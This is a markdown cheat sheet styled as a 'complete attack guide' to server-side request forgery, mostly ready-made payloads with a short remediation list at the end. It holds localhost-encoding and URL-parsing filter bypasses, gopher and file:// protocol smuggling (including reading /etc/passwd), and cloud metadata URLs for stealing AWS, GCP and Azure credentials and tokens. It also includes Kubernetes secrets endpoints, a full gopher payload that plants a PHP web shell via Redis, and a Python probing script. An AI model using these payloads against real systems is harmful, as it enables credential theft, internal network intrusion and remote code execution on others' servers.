# SSRF — Complete Attack Guide

## 1. Detection

### 1.1 Basic SSRF
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1          # Octal
http://2130706433          # Decimal
http://0x7f000001          # Hex
```

### 1.2 DNS Rebinding
```
1. Register domain with short TTL (e.g., rebinder.attacker.com)
2. First resolution: public IP (passes validation)
3. Second resolution: internal IP (127.0.0.1)
4. Tool: singularity-dns, rbndr.us
```

### 1.3 Protocol Smuggling
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a...
file:///etc/passwd
dict://127.0.0.1:6379/info
```

## 2. Cloud Metadata

### 2.1 AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/hostname
```

### 2.2 GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```
**Note:** GCP requires `Metadata-Flavor: Google` header

### 2.3 Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ip-address/0/publicIpAddress?api-version=2021-02-01
```
**Note:** Azure requires `Metadata: true` header

### 2.4 DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
```

## 3. Internal Service Discovery

### 3.1 Common Internal Ports
```
http://127.0.0.1:80      # Web server
http://127.0.0.1:443     # HTTPS
http://127.0.0.1:3000    # Grafana/Node.js
http://127.0.0.1:5000    # Flask/Redis
http://127.0.0.1:6379    # Redis
http://127.0.0.1:8080    # Proxy/App
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:11211   # Memcached
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:5432    # PostgreSQL
```

### 3.2 Kubernetes
```
https://kubernetes.default.svc
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
```

## 4. Exploitation Chains

### 4.1 SSRF → Redis RCE
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3Fphp%20system($_GET['cmd'])%3F>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 4.2 SSRF → Cloud Credentials
```
1. http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Extract IAM role name
3. http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}
4. Get AccessKeyId + SecretAccessKey + Token
5. Use AWS CLI with stolen credentials
```

### 4.3 SSRF → Database Dump
```
1. Discover internal DB port (e.g., 3306)
2. Use gopher:// to send MySQL protocol commands
3. Extract database contents
```

## 5. Bypass Techniques

### 5.1 IP Obfuscation
```
http://127.1                  # Short form
http://0177.0.0.1             # Octal
http://0x7f.0x0.0x0.0x1      # Hex
http://2130706433              # Decimal
http://017700000001            # Octal full
http://[::ffff:127.0.0.1]    # IPv6
http://0.0.0.0                # All interfaces
```

### 5.2 DNS-Based Bypass
```
http://localtest.me            # Resolves to 127.0.0.1
http://127.0.0.1.nip.io       # NIP.IO wildcard
http://spoofed.burpcollaborator.net  # Custom DNS
```

### 5.3 URL Parsing Bypass
```
http://target.com@127.0.0.1   # userinfo@ trick
http://127.0.0.1#@target.com  # fragment trick
http://target.com%00@127.0.0.1  # null byte
http://attacker.com\@127.0.0.1  # backslash
```

### 5.4 Protocol Bypass
```
gopher://127.0.0.1:25/        # SMTP
gopher://127.0.0.1:6379/      # Redis
dict://127.0.0.1:6379/info    # Redis via dict
file:///etc/passwd             # Local file read
```

### 5.5 Redirect Bypass
```
http://attacker.com/redirect?url=http://127.0.0.1
# If the server follows redirects, it reaches internal IP
```

## 6. Tool Detection

### Nuclei Templates
```bash
nuclei -u http://target -tags ssrf
```

### Manual Testing
```python
import requests
# Test various bypass techniques
payloads = [
    "http://127.0.0.1",
    "http://0177.0.0.1",
    "http://0x7f000001",
    "http://2130706433",
    "http://[::1]",
    "http://0.0.0.0",
]
for payload in payloads:
    r = requests.get(f"http://target/fetch?url={payload}")
    print(f"{payload}: {r.status_code} {len(r.text)}")
```

## 7. Remediation

1. **Allowlist outbound requests** — Only allow specific domains/IPs
2. **Block internal IP ranges** — 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16
3. **Disable unnecessary URL schemes** — file://, gopher://, dict://
4. **Use network segmentation** — Application servers shouldn't directly access metadata
5. **Validate DNS resolution** — Resolve hostname and check if IP is internal
6. **IMDSv2 (AWS)** — Require session token for metadata access
